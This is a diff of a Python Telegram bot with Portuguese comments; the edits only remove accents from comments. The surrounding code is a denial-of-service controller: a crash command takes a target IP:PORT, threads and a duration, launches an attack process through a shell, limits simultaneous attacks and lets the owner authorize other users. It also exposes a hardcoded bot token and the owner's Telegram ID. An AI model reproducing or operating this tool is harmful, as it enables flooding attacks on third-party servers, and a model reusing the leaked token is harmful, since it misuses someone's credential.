@@ -9,8 +9,8 @@ BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
 SEU_ID_TELEGRAM = 6430703027
 bot = telebot.TeleBot(BOT_TOKEN)
 processos = {}
-authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
-MAX_ATTACKS = 3  # Limite de ataques simultâneos
+authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuarios autorizados
+MAX_ATTACKS = 3  # Limite de ataques simultaneos
 
 # Função para validar o formato de IP e Porta
 def validar_ip_porta(ip_porta):
@@ -25,18 +25,18 @@ def executar_comando(ip_porta, threads, tempo):
         processo = subprocess.Popen(
             comando_terminal, 
             shell=True, 
-            cwd=os.path.dirname(os.path.abspath(__file__)),  # Define o diretório atual do bot
+            cwd=os.path.dirname(os.path.abspath(__file__)),  # Define o diretorio atual do bot
             stdout=subprocess.PIPE, 
             stderr=subprocess.PIPE
         )
         processos[ip_porta] = processo
         time.sleep(int(tempo))  # Aguarda o tempo do ataque
-        processo.terminate()  # Termina o processo após o tempo especificado
+        processo.terminate()  # Termina o processo apos o tempo especificado
         del processos[ip_porta]  # Remove o processo da lista
     except Exception as e:
         print(f"Erro ao executar o comando: {str(e)}")
 
-# Função para gerenciar o limite de ataques simultâneos
+# Funcao para gerenciar o limite de ataques simultâneos
 def manage_attacks():
     if len(processos) >= MAX_ATTACKS:
         oldest_process = list(processos.values())[0]  # Pega o primeiro processo
@@ -72,17 +72,17 @@ def crash_server(message):
         return
 
     ip_porta = comando[1]
-    threads = '10'  # Valor padrão de threads
-    tempo = '900'  # Valor padrão de tempo
+    threads = '10'  # Valor padrao de threads
+    tempo = '900'  # Valor padrao de tempo
 
-    # Se o usuário enviar o IP com o tempo
+    # Se o usuario enviar o IP com o tempo
     if len(comando) == 3:
-        tempo = comando[2]  # Ajusta o tempo se o usuário passar o tempo
+        tempo = comando[2]  # Ajusta o tempo se o usuario passar o tempo
     elif len(comando) == 4:
-        threads = comando[2]  # Ajusta as threads se o usuário passar os parâmetros corretos
+        threads = comando[2]  # Ajusta as threads se o usuario passar os parâmetros corretos
         tempo = comando[3]
 
-    # Verificar se já existe um processo em andamento para o mesmo IP
+    # Verificar se ja existe um processo em andamento para o mesmo IP
     if ip_porta in processos:
         bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}. Tente novamente mais tarde.")
         return
@@ -91,7 +91,7 @@ def crash_server(message):
         bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
         return
 
-    # Gerenciar o limite de ataques simultâneos
+    # Gerenciar o limite de ataques simultaneos
     manage_attacks()
 
     # Notificar que o ataque vai começar
@@ -106,7 +106,7 @@ def crash_server(message):
 def send_user_id(message):
     bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")
 
-# Comandos de administração (somente o dono pode usar)
+# Comandos de administracao (somente o dono pode usar)
 @bot.message_handler(commands=['adduser', 'removeuser'])
 def admin_commands(message):
     if message.from_user.id != SEU_ID_TELEGRAM:
@@ -134,7 +134,7 @@ def admin_commands(message):
         else:
             bot.send_message(message.chat.id, "Usuário não encontrado.")
 
-# Função para manter o bot ativo (reconectar automaticamente em caso de falhas)
+# Funcao para manter o bot ativo (reconectar automaticamente em caso de falhas)
 def keep_alive():
     while True:
         try:
